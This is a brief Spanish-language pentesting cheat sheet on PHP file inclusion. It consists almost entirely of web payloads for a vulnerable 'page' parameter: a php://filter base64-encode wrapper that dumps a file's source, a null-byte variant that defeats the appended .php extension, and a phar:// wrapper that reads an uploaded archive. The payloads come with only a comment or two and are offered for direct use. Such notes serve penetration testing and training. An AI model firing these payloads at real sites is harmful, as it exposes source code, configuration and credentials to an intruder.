
# BASE64 UTILIZANDO WRAPPER
```shell
#POR EJEMPLO TENEMOS UN PARAMETRO page QUE APUNTA A ARCHIVOS Y LE CONCATENA EL .php PUES VAMOS A VER EL CONTENIDO DE TODO EL ARCHIVO EN BASE64

?page=php://filter/convert.base64-encode/resource=admin

?page=php://filter/convert.base64-encode/resource=admin%00 #NULL BYTE
```


### LISTAR CONTENIDO DE UN COMPRIMIDO
```shell
?page=phar://uploads/23798462897481dsjad19d/test.pwned/test
```